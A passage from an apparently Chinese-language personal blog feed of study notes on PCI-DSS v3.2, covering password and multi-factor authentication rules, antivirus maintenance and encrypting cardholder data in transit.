alt="8.2.1"><br>对于我们前面使用的验证凭证，我们需要确保其安全的存储，不会被删改，就和前面的ID标识符一样。我们使用强效的加密手段，确保这些验证凭证在传输和存储的时候都不可读，不会泄露。如果未被加密，很有可能就会被攻击者嗅探获取，盗用身份。</p><h4 id="8-2-2-在修改任何验证凭证（例如，执行密码重置、提供新令牌或生成新密钥）前验证用户身份"><a href="#8-2-2-在修改任何验证凭证（例如，执行密码重置、提供新令牌或生成新密钥）前验证用户身份" class="headerlink" title="8.2.2 在修改任何验证凭证（例如，执行密码重置、提供新令牌或生成新密钥）前验证用户身份"></a>8.2.2 在修改任何验证凭证（例如，执行密码重置、提供新令牌或生成新密钥）前验证用户身份</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-9626eb6da424bba0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.2"><br>就是我们在修改用户的身份验证凭证的时候，我们要确保是我在修改我的密码，而不是别人在修改我的密码。这里系统需要确认的是提交修改人的身份，我们就通过之前的验证凭证来验证用户的身份。<br>这里第一次提到了社交工程蓄，就说说吧。就算我们安全措施做的很多，攻击者的手段层出不穷，道高一尺，魔高一丈。<br>一个叫“社交工程学”的攻击手段在国内外十分的流行，让我来形容“社工”，就是四个字，坑蒙拐骗。通过各种渠道，骗取你的密码，已经不是对一个系统来寻找漏洞，而是对一个人来寻找漏洞。钓鱼邮件就是典型的社工的一种，对于不同性格的人使用不同的钓鱼邮件链接，记得英国有一个著名的黑客攻击事件，就是利用领养猫的钓鱼邮件获取密码的。</p><h4 id="8-2-3-密码-口令必须符合以下要求："><a href="#8-2-3-密码-口令必须符合以下要求：" class="headerlink" title="8.2.3 密码/口令必须符合以下要求："></a>8.2.3 密码/口令必须符合以下要求：</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-678f2d7286a0ce55.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.3"><br>1、要求长度至少为7个字符<br>2、同时包含数字和字母字符<br>或者，密码/口令必须具有至少与上面指定参数相当的复杂度和强度<br>密码强度也是一个很愁人的问题，毕竟现在密码负担也是一个大难题。我们对于密码强度的要求，必须在一个合适的范围内，密码强度要求低了密码很容易会被攻击者猜到，密码强度高了同样不行，有的人就会很奇怪，密码强度难道不是越高越好吗，很多调查显示不是这样的。<br>比如我们现在要求密码10位以上要有字母，数字，特殊符号，这就会有很多姓名拼音+生日+符号的组合，或者类似于qwer1234！@#￥这样的有规律的密码出现。所以合适的密码强度也很重要。<br>同时不要使用默认密码！！！进过很多公司，在注册时还会显示默认密码123456，很奇葩，怕攻击者找不到方法。还有在变更密码强度策略时，比如之前没有密码强度校验，现在增加密码强度校验，必须对已经注册的没有达到标准的用户先提示，在强制性的更改成达到标准的密码。<br>对于这个密码强度，行业内也有标准，比如： NIST SP 800-63。</p><h4 id="8-2-4-至少每90天变更一次用户密码-口令"><a href="#8-2-4-至少每90天变更一次用户密码-口令" class="headerlink" title="8.2.4 至少每90天变更一次用户密码/口令"></a>8.2.4 至少每90天变更一次用户密码/口令</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-36d5fb9a6dbfc85c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.4"><br>医生也推荐我们每3个月换一次牙刷，因为一个牙刷用久了，很多这个牙刷清理不到的地方会有很多残留的污渍。因为我们的牙刷不是完美的。我们的密码也是一样的，我们的密码不可能是别人永远无法猜到的，所以我们需要定时的更新密码。但是当有严重的泄露风险时要及时更换。</p><h4 id="8-2-5-不允许个人提交与最近使用的4个密码-口令中任何一个相同的新密码-口令"><a href="#8-2-5-不允许个人提交与最近使用的4个密码-口令中任何一个相同的新密码-口令" class="headerlink" title="8.2.5 不允许个人提交与最近使用的4个密码/口令中任何一个相同的新密码/口令"></a>8.2.5 不允许个人提交与最近使用的4个密码/口令中任何一个相同的新密码/口令</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-a3ca12a9f25a0182.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.5-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-d7bf20db45f120fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.5-2"><br>的确有为了自己方便的用户，为了应对服务商的3个月变更密码的要求就只有两个密码，轮着换，虽然方便，但是很不安全。所有我们也不能允许新密码与之前四次的密码相同，至于为什么是四次，这个应该就是大数据调查吧，低了容易泄露，高了容易让用户每次设置有规律的密码。</p><h4 id="8-2-6-将每个用户首次使用的密码-口令和重置密码-口令设为唯一值，并在首次使用后立即变更"><a href="#8-2-6-将每个用户首次使用的密码-口令和重置密码-口令设为唯一值，并在首次使用后立即变更" class="headerlink" title="8.2.6 将每个用户首次使用的密码/口令和重置密码/口令设为唯一值，并在首次使用后立即变更"></a>8.2.6 将每个用户首次使用的密码/口令和重置密码/口令设为唯一值，并在首次使用后立即变更</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-d52f0322ab1e7ba5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.2.6"><br>就是确保用户注册时的第一个密码的唯一，不能和其他用户重复，如果每个新用户比如IBM公司的员工都用IBM2018.这样的密码，那就很容易被发现。这个在公司内部很多都是很常见的。因为个人的密码负担，很多人会将密码和所属系统联系在一些，比如公司名等。所有密码的唯一性也很重要。</p><h3 id="8-3-使用多因素验证保护对CDE的所有单独飞控制台管理访问和所有远程访问"><a href="#8-3-使用多因素验证保护对CDE的所有单独飞控制台管理访问和所有远程访问" class="headerlink" title="8.3 使用多因素验证保护对CDE的所有单独飞控制台管理访问和所有远程访问"></a>8.3 使用多因素验证保护对CDE的所有单独飞控制台管理访问和所有远程访问</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-56c9d37c6a644fcd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.3"><br>对与持卡人数据环境的远程访问，或者非控制台访问，我们要使用多因素验证。这里的多因素就是说的前面的三种验证手段中的两种或两种以上，不包括一种方法使用两次，那样安全性的提升并不是很大。</p><h3 id="8-3-1-将针对所有非控制台访问的多因素验证融入针对具有管理访问权限的工作人员的CDE"><a href="#8-3-1-将针对所有非控制台访问的多因素验证融入针对具有管理访问权限的工作人员的CDE" class="headerlink" title="8.3.1 将针对所有非控制台访问的多因素验证融入针对具有管理访问权限的工作人员的CDE"></a>8.3.1 将针对所有非控制台访问的多因素验证融入针对具有管理访问权限的工作人员的CDE</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-72a263462a7c684f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.3.1"><br>这是针对所有有权限访问持卡人数据环境的工作人员。<br>这里按照指南可以看到如果持卡人数据环境和其他网络环境没有隔离，那就在具有访问权的工作人员进入这个网络的时候要执行多因素认证。<br>如果持卡人数据环境和其他网络分离了，那就在拥有访问权限的工作人员从其他网络环境进入持卡人数据环境的时候进行多因素验证。</p><h3 id="8-3-2-针对来自实体网络外部的所有远程网络访问（针对用户和管理员，并包括出于支持和维护目的的第三方访问）加入多因素验证"><a href="#8-3-2-针对来自实体网络外部的所有远程网络访问（针对用户和管理员，并包括出于支持和维护目的的第三方访问）加入多因素验证" class="headerlink" title="8.3.2 针对来自实体网络外部的所有远程网络访问（针对用户和管理员，并包括出于支持和维护目的的第三方访问）加入多因素验证"></a>8.3.2 针对来自实体网络外部的所有远程网络访问（针对用户和管理员，并包括出于支持和维护目的的第三方访问）加入多因素验证</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-e7ff72a8fad72118.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.3.2"><br>对于来自外部互联网的对公司内部网络的所有远程访问都要用多因素认证。<br>多因素认证在外网远程访问公司内网的情况下，主要是针对员工用户和管理员或者因其他需求导致的第三方访问。</p><h3 id="8-4-为所有用户编写并传达验证政策和程序"><a href="#8-4-为所有用户编写并传达验证政策和程序" class="headerlink" title="8.4 为所有用户编写并传达验证政策和程序"></a>8.4 为所有用户编写并传达验证政策和程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-6fe848d535c2da9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.4"><br>包括：<br>1、选择强效验证凭证的指南<br>2、关于用户应如何保护其验证凭证的指南<br>3、关于不重用之前用过的密码的说明<br>4、在怀疑密码可能受到威胁的情况下更改密码的相关说明<br>这个相当于对前面要求的一个总结，对于前面的这些要求，很多是针对用户来说的，我们要有相应的方法，指导用户按着我们的要求执行，所有我们要有相关的指南。<br>比如选择强效验证凭证的指南，告诉用户密码强度的要求，以及不要使用有规律的密码等。<br>向所有的用户传达这些要求和指南他们保证他们了解并遵守。</p><h3 id="8-5-不要使用群组、共享或常规的ID、密码或其他验证方法"><a href="#8-5-不要使用群组、共享或常规的ID、密码或其他验证方法" class="headerlink" title="8.5 不要使用群组、共享或常规的ID、密码或其他验证方法"></a>8.5 不要使用群组、共享或常规的ID、密码或其他验证方法</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c8f6f1846e24a132.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.5"><br>具体如下：<br>1、常规用户ID已禁用或删除<br>2、用于系统管理和其他重要功能的共享用户ID不存在<br>3、不使用共享和常规用户ID管理任何系统组件<br>之前已经说过ID标识符是对应个人的，不能一个ID对应多个人员，这样无法追究到具体操作到具体人员。以及删除那些不必要的常规ID或者共享ID等多余功能。</p><h4 id="8-5-1-可远程访问客户所在地的服务提供商（例如，为支持POS系统或服务器）须针对每个客户使用唯一的验证凭证（例如密码-口令）（仅针对服务商的额外要求）"><a href="#8-5-1-可远程访问客户所在地的服务提供商（例如，为支持POS系统或服务器）须针对每个客户使用唯一的验证凭证（例如密码-口令）（仅针对服务商的额外要求）" class="headerlink" title="8.5.1 可远程访问客户所在地的服务提供商（例如，为支持POS系统或服务器）须针对每个客户使用唯一的验证凭证（例如密码/口令）（仅针对服务商的额外要求）"></a>8.5.1 可远程访问客户所在地的服务提供商（例如，为支持POS系统或服务器）须针对每个客户使用唯一的验证凭证（例如密码/口令）（仅针对服务商的额外要求）</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c3548ea5ffc46d08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.5.1"><br>服务商要确保为每一个客户提供唯一的不同的验证凭证。多个客户使用同一个验证凭证，对于每个客户来说都是很危险的。</p><h3 id="8-6-在使用其他验证机制（例如物理或逻辑安全令牌、智能卡、证书等）的情形下，须按照下述要求分配这些机制的用法："><a href="#8-6-在使用其他验证机制（例如物理或逻辑安全令牌、智能卡、证书等）的情形下，须按照下述要求分配这些机制的用法：" class="headerlink" title="8.6 在使用其他验证机制（例如物理或逻辑安全令牌、智能卡、证书等）的情形下，须按照下述要求分配这些机制的用法："></a>8.6 在使用其他验证机制（例如物理或逻辑安全令牌、智能卡、证书等）的情形下，须按照下述要求分配这些机制的用法：</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-1896cb33d059fabc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.6-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-a1de791f3520f820.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.6-2"><br>1、验证机制必须分配到单个账户，不得在多个账户之间共享<br>2、必须要有物理和/或逻辑控制，以确保仅既定账户可使用该机制获得访问权限<br>对于前面说的验证机制的除了第一个密码的其他两个，令牌设备或智能卡和个人特征，我们也要有和ID一样，每一个验证数据仅对应一个账号，不能多人共享！<br>通过物理或逻辑控制（比如指纹，虹膜）我们可以防止非授权用户通过共享的方法或的访问权。因为这些是可以唯一识别用户的。</p><h3 id="8-7-已按照下述要求限制了对任何包含持卡人数据的数据库的所有访问（包括应用程序、管理员和其他所有用户的访问）"><a href="#8-7-已按照下述要求限制了对任何包含持卡人数据的数据库的所有访问（包括应用程序、管理员和其他所有用户的访问）" class="headerlink" title="8.7 已按照下述要求限制了对任何包含持卡人数据的数据库的所有访问（包括应用程序、管理员和其他所有用户的访问）"></a>8.7 已按照下述要求限制了对任何包含持卡人数据的数据库的所有访问（包括应用程序、管理员和其他所有用户的访问）</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-b1bf2f95e07827ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.8"><br>1、用户对数据库的所有访问、查询和操作均通过编程方法完成<br>2、仅数据库管理员能直接访问或查询数据库<br>3、数据库应用程序的应用程序ID仅可由这些应用程序使用（个人用户或其他非应用程序流程不能使用）<br>针对持卡人数据所在数据库来说，我们对每一个用户对这个数据库的访问都必须进行验证。同时验证完身份之后我们要保证所有的数据库操作都是通过存储代码或程序执行的，而不是用户自己执行的，不是用户访问数据库执行的。<br>权限方面，只有数据库的管理员可以直接访问和查询数据库。且对于那些访问了数据库的应用程序我们确认这个应用程序的ID仅仅可他自己使用，不会被其他流程或个人调用。<br>感觉这一条包含的信息还是很多的，但是经验不足，体会不出里面的精髓。之后会补上。</p><h3 id="8-8-确保已记录，正在使用且所有相关方了解用于身份是被和验证的安全政策与操作程序"><a href="#8-8-确保已记录，正在使用且所有相关方了解用于身份是被和验证的安全政策与操作程序" class="headerlink" title="8.8 确保已记录，正在使用且所有相关方了解用于身份是被和验证的安全政策与操作程序"></a>8.8 确保已记录，正在使用且所有相关方了解用于身份是被和验证的安全政策与操作程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-cd09c4e84da75b2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.8"><br>对于用于身份识别和验证的安全政策与操作程序我们按照要求指定了相应的政策，我们要有详细的记录，并确保相关人员以及进行学习并严格遵守。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>实施强效的访问控制，识别并验证对系统组件的访问。要求8的这些都是围绕对系统组件访问的识别和验证。识别和验证就会涉及到验证数据，所以里面也说到了密码策略，以及三个眼政方案。<br>很全面的，唯一想说的是密码策略中的安全策略很多都是牺牲了其他的来换取安全，可能我们牺牲了用户体验，或者工作人员的便利但是换取的安全是十分值得的。但是在公司制定安全策略的时候还是得因地制宜，根据不同的需求制定不同的策略。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-八&quot;&gt;&lt;a href=&quot;#PCI-DSS-V3-2-学习笔记-八&quot; class=&quot;headerlink&quot; title=&quot;PCI-DSS(V3.2)学习笔记(八)&quot;&gt;&lt;/a&gt;PCI-DSS(V3.2)学习笔记(八)&lt;/h
      
    
    </summary>
    
      <category term="安全知识" scheme="http://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="http://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(五)</title>
    <link href="http://rliyuqing.github.io/2019/04/15/18.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%BA%94)/"/>
    <id>http://rliyuqing.github.io/2019/04/15/18. PCI-DSS(V3.2.1)学习笔记(五)/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:50:12.750Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="PCI-DSS-V3-2-学习笔记-五"><a href="#PCI-DSS-V3-2-学习笔记-五" class="headerlink" title="PCI-DSS(V3.2)学习笔记(五)"></a>PCI-DSS(V3.2)学习笔记(五)</h1><hr><h1 id="三、维护漏洞管理计划"><a href="#三、维护漏洞管理计划" class="headerlink" title="三、维护漏洞管理计划"></a>三、维护漏洞管理计划</h1><p>维护漏洞管理计划，我们前面说了安全的网络和系统的基本建设的要求，以及保护我们的持卡人数据不被攻击者窃取等，现在要说的是如果我们做的都很好了，但是任会攻击者通过某种方法攻击我们，比如新型的病毒或者漏洞，之前看过一部电影《我是谁，没有绝对安全的系统》的确，所有系统都是人搭建的，没有绝对完美的人，也没有绝对安全的系统，我们不能做好了所有的保护措施，认为攻击者不可能窃取我们的信息了。我们搭建好了符合PCI DSS要求的保护措施，也要有应对攻击可能发生的计划，也就是说漏洞的管理计划。</p><h2 id="要求5：为所有系统提供恶意软件防护并定期更新杀毒软件或程序"><a href="#要求5：为所有系统提供恶意软件防护并定期更新杀毒软件或程序" class="headerlink" title="要求5：为所有系统提供恶意软件防护并定期更新杀毒软件或程序"></a>要求5：为所有系统提供恶意软件防护并定期更新杀毒软件或程序</h2><p>说道恶意软件我想绝对所有人都被不同程度的骚扰过。我很少使用这么偏激的程度副词，绝对，那是因为网络上的恶意软件已经铺天盖地，无孔不入。有一些只是一些骗取流量的广告，还有的甚至是通过恶意软件利用你的设备进行挖矿等，编程“肉鸡”。<br>有些针对特东漏洞的恶意软件进入我们网络后会利用系统漏洞，进行破坏，带来很大的威胁，所以对恶意软件的定期防护和杀毒软件的更新还是很有必要的！</p><h3 id="5-1-在经常受到恶意软件影响的所有系统（特别是个人电脑和服务器）中部署杀毒软件。"><a href="#5-1-在经常受到恶意软件影响的所有系统（特别是个人电脑和服务器）中部署杀毒软件。" class="headerlink" title="5.1 在经常受到恶意软件影响的所有系统（特别是个人电脑和服务器）中部署杀毒软件。"></a>5.1 在经常受到恶意软件影响的所有系统（特别是个人电脑和服务器）中部署杀毒软件。</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-85162301e7ae0f31.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.1"><br>对于可能会被恶意软件入侵的系统，特别是个人电脑，服务器。我们要部署特定的杀毒软件，当然这个杀毒软件的实时更新是很有必要的，因为很多都是利用0day漏洞进行攻击，杀毒软件的实时更新极为重要，必要时需要手工测试，分析。</p><h4 id="5-1-1-确保杀毒程序能检测、删除并阻止所有已知类型的恶意软件"><a href="#5-1-1-确保杀毒程序能检测、删除并阻止所有已知类型的恶意软件" class="headerlink" title="5.1.1 确保杀毒程序能检测、删除并阻止所有已知类型的恶意软件"></a>5.1.1 确保杀毒程序能检测、删除并阻止所有已知类型的恶意软件</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-97ae310ffbbe81dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.1.1"><br>这就是确保我们选取的杀毒软件的强大性，选择一款好的杀毒软件很重要，虽然这听着像是广告，但是功能上有盲点的杀毒软件就和有短板的水桶一样，其他东西在高，有一个短板，攻击者便可以轻松实施攻击手段。<br>所有我们要确保我们使用的杀毒软件能够阻止所有类型和形式的恶意软件。</p><h4 id="5-1-2-对于通常不收恶意软件影响的系统，需要执行定西评估已确定并评估不断进化的恶意软件的威胁，从而确认这些系统是否仍不需要使用杀毒软件。"><a href="#5-1-2-对于通常不收恶意软件影响的系统，需要执行定西评估已确定并评估不断进化的恶意软件的威胁，从而确认这些系统是否仍不需要使用杀毒软件。" class="headerlink" title="5.1.2 对于通常不收恶意软件影响的系统，需要执行定西评估已确定并评估不断进化的恶意软件的威胁，从而确认这些系统是否仍不需要使用杀毒软件。"></a>5.1.2 对于通常不收恶意软件影响的系统，需要执行定西评估已确定并评估不断进化的恶意软件的威胁，从而确认这些系统是否仍不需要使用杀毒软件。</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-0b769d6ccdc360bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.1.2"><br>我们前面对那些可能遭到恶意软件入侵的系统都安全了功能强大的杀毒软件，但是那些被我们规定为不可能遭到恶意软件的系统是否会一直是安全的呢。<br>在我们业务变动的时候可能系统的配置会发生改变，可能会由安全变得不安全，或者恶意软件的入侵能力因为某些条件便强，使得原本不受威胁的系统现在受威胁。<br>上面这两个条件的发生是极为可能的，所以我们要定期对这些不受威胁的系统进行评估，确保他们仍然不受威胁。这个定期可能是一个周期，但是当业务变动导致系统配置发生变化，和恶意软件的重要进化发生时也必须进行重新评估。</p><h3 id="5-2-确保所有杀毒软件按如下方式维护"><a href="#5-2-确保所有杀毒软件按如下方式维护" class="headerlink" title="5.2 确保所有杀毒软件按如下方式维护"></a>5.2 确保所有杀毒软件按如下方式维护</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-7579a16f2d956656.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.2"><br>1、保持为最新<br>2、执行定期扫描<br>3、生成检查日志（PCI DSS要求10.7规定保留）<br>三个维护要求，通过配置自动更新保持为最新，就是为了保证不会出现新的短板，导致服务器被恶意软件入侵；配置执行定期扫描，这个就不用说了，杀毒软件就得定期的扫描。生成检查日志呢，这个也很重要。我们可以通过日志查看到我们监控病毒或恶意软件的活动以及反恶意软件的效果。</p><h3 id="5-3-确保杀毒机制积极运行且无法被用户禁用或更改，除非管理人员根据具体情况作出有时间限制的明确授权"><a href="#5-3-确保杀毒机制积极运行且无法被用户禁用或更改，除非管理人员根据具体情况作出有时间限制的明确授权" class="headerlink" title="5.3 确保杀毒机制积极运行且无法被用户禁用或更改，除非管理人员根据具体情况作出有时间限制的明确授权"></a>5.3 确保杀毒机制积极运行且无法被用户禁用或更改，除非管理人员根据具体情况作出有时间限制的明确授权</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-394fe7f76e40e067.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.3"><br>我们在要求1中的最后也曾看到过类似的要求：对于一些便携式计算设备要加防火墙并使用户自己无法更改。这里也是类似的，但也有不同。<br>我们是针对所有可能被恶意软件入侵的系统，我们在安装了杀毒软件之后，要确保这些软件一直是处于运行，且非管理人员无法更改的状态。而且只有有合理的技术或业务需要时才能在获得管理人员的批准，并且进行了其他的安全保护措施之后才能可以暂时的一定时间的禁用杀毒软件。</p><h3 id="5-4-确保已记录、正在使用且所有相关方了解为系统提供恶意软件防护的安全政策和操作程序"><a href="#5-4-确保已记录、正在使用且所有相关方了解为系统提供恶意软件防护的安全政策和操作程序" class="headerlink" title="5.4 确保已记录、正在使用且所有相关方了解为系统提供恶意软件防护的安全政策和操作程序"></a>5.4 确保已记录、正在使用且所有相关方了解为系统提供恶意软件防护的安全政策和操作程序</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-2ef402f3ff7b10a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.4"><br>确保我们的提供恶意软件保护的这个机制有详细的文件记录，且相关人员已经进行了学习，并严格按照这个记录文件的标准进行执行。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于提供杀毒软件保护的策略我们也进行学习了，这个可能博主经历的也比较少，主要都是个人PC端的杀毒软件保护，没有正真体验过公司内部的情况，所以自己的看法也有些粗鄙。但是0day还是看过很多的。记得前不久有一个GhostScript沙箱绕过的漏洞，影响了最新版本的imagemaick，可以远程命令执行，当时很多大公司都出现了问题，包括新浪，百度贴吧，博主身边的朋友用这个POC也混了不少src的奖金。另外，就今天看到一个分享CVE-2018-3191的WebLogic的远程代码指定漏洞被灰产做成了批量攻击工具，又被捕获了一大批肉鸡。所以杀毒软件的更新是很重要的，因为我们无法避免0day的产生，所以要保证我们的响应速度最快，也得保证我们使用的杀毒软件的工具为最新的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;PCI-DSS-V3-2-学习笔记-五&quot;&gt;&lt;a href=&quot;#PCI-DSS-V3-2-学习笔记-五&quot; class=&quot;headerlink&quot; title=&quot;PCI-DSS(V3.2)学习笔记(五)&quot;&gt;&lt;/a&gt;PCI-DSS(V3.2)学习笔记(五)&lt;/h
      
    
    </summary>
    
      <category term="安全知识" scheme="http://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="http://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PCI-DSS(V3.2)学习笔记(四)</title>
    <link href="http://rliyuqing.github.io/2019/04/15/17.%20PCI-DSS(V3.2.1)%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E5%9B%9B)/"/>
    <id>http://rliyuqing.github.io/2019/04/15/17. PCI-DSS(V3.2.1)学习笔记(四)/</id>
    <published>2019-04-15T14:44:28.000Z</published>
    <updated>2019-04-16T15:50:02.533Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="PCI-DSS-V3-2-学习笔记-四"><a href="#PCI-DSS-V3-2-学习笔记-四" class="headerlink" title="PCI-DSS(V3.2)学习笔记(四)"></a>PCI-DSS(V3.2)学习笔记(四)</h1><hr><h1 id="二、保护持卡人数据"><a href="#二、保护持卡人数据" class="headerlink" title="二、保护持卡人数据"></a>二、保护持卡人数据</h1><h2 id="要求4：加密持卡人数据在开放式公共网络中的传输"><a href="#要求4：加密持卡人数据在开放式公共网络中的传输" class="headerlink" title="要求4：加密持卡人数据在开放式公共网络中的传输"></a>要求4：加密持卡人数据在开放式公共网络中的传输</h2><p>要求3针对的是存储的持卡人数据的保护措施，要求4则是持卡人数据传输过程中的安全措施。<br>如何保护传输中的持卡人数据呢，在我看来主要有两个方向，一个是建立一个安全的传输信道，或者利用第三方安全的传输信道传输持卡人数据，另一个就是对持卡人数据进行强效加密，保证就算攻击者拿到持卡人数据也无法翻译成明文。<br>我们具体来看看要求4中说的都有哪些吧。</p><h3 id="4-1-使用强效加密法和安全协议来保护经由公开、公共网络传输的敏感持卡人数据。"><a href="#4-1-使用强效加密法和安全协议来保护经由公开、公共网络传输的敏感持卡人数据。" class="headerlink" title="4.1 使用强效加密法和安全协议来保护经由公开、公共网络传输的敏感持卡人数据。"></a>4.1 使用强效加密法和安全协议来保护经由公开、公共网络传输的敏感持卡人数据。</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-816f73268922fb45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.1-1"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-83bb7ab2738254b5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.1-2"><br>包括：<br>1、只接受可信任的密钥和证书<br>2、使用的协议只支持安全的版本或配置<br>3、加密强度适合所有的加密方法<br>开放式网络就是不安全的网络，这里泛指互联网，GSM，GPRS等。<br>这里就是围绕安全的信道和持卡人数据的加密来说的。我们通过一系列的方法，例如安全的协议等来构造安全的通信通道，且确保我们的配置正确，安全以及所支持的版本没有问题。<br>我们也会通过提前测试通话传输，确保传输被强效加密。强效加密我们前面也说了很多次了，但是注意我们要选取最优的加密方式，并不是加密效果越强越好，我们必须根据具体业务需要进行选择，如果一个加解密耗费三四秒，在很多地方及其影响用户体验。<br>这里特别针对TLS来说了说，最近google chrome已经对所有未加密的网站都会在地址栏上明确标记为“Not Secure”（不安全）。也就是说，如果你的网站没有采用HTTPS协议，当使用谷歌新版浏览器的用户访问网站时就会出现不安全提示。<br>另一点我们使用https的时候也要注意SSL协议的版本的安全性，确保使用安全的SSL协议的版本，使用存在漏洞版本的SSL也是极不安全的。</p><h4 id="4-1-1-确保传输持卡人数据或连接到持卡人数据环境的无线网络使用行业最优方法，以及验证和传输实施强效加密"><a href="#4-1-1-确保传输持卡人数据或连接到持卡人数据环境的无线网络使用行业最优方法，以及验证和传输实施强效加密" class="headerlink" title="4.1.1 确保传输持卡人数据或连接到持卡人数据环境的无线网络使用行业最优方法，以及验证和传输实施强效加密"></a>4.1.1 确保传输持卡人数据或连接到持卡人数据环境的无线网络使用行业最优方法，以及验证和传输实施强效加密</h4><p><img src="https://upload-images.jianshu.io/upload_images/6269327-72a507c6349bc050.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.1.1"><br>针对持卡人数据可能流通的网络来说，尤其是无线网络，我们确保在这个无线环境内使用了传输的验证和强效加密。<br>为什么这里要特别说一下持卡人数据环境所连接的无线网络呢，前面已经针对在开放式网络中的安全传输的要求了。很多时候我们只注意了外部不安全网络的防护，却忽略了内部的无线网络的安全，这也是我们需要注意的。如果攻击者混入内网，或者办公网，则任科员嗅探捕获我们的持卡人数据。</p><h3 id="4-2-不要使用终端用户通讯技术（例如，电子邮件、即使通讯、短信、聊天等）来传送不受保护的PAN"><a href="#4-2-不要使用终端用户通讯技术（例如，电子邮件、即使通讯、短信、聊天等）来传送不受保护的PAN" class="headerlink" title="4.2 不要使用终端用户通讯技术（例如，电子邮件、即使通讯、短信、聊天等）来传送不受保护的PAN"></a>4.2 不要使用终端用户通讯技术（例如，电子邮件、即使通讯、短信、聊天等）来传送不受保护的PAN</h3><p><img src="https://upload-images.jianshu.io/upload_images/6269327-8d3c093e07bb9c9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.2"><br>结合前面的我们知道，我们必须确保在开放式网络中通过安全的信道传输未加密，未受保护的敏感数据，我们如果通过终端用户通讯技术，我们无法保证我们通讯没有被监听，捕获。<br>如果我们使用这些终端用户通讯技术，我们确保我们传输的敏感数据，比如PAN是强效加密的，以及密钥是提前安全共享的，或确保他不可读。</p><h3 id="4-3-确保已记录、正在使用且所有相关方了解用于加密持卡人数据传输的安全政策和操作程序"><a href="#4-3-确保已记录、正在使用且所有相关方了解用于加密持卡人数据传输的安全政策和操作程序" class="headerlink" title="4.3 确保已记录、正在使用且所有相关方了解用于加密持卡人数据传输的安全政策和操作程序"></a>4.3 确保已记录、正在使用且所有相关方了解用于加密持卡人数据传输的安全政策和操作程序</h3><p><img 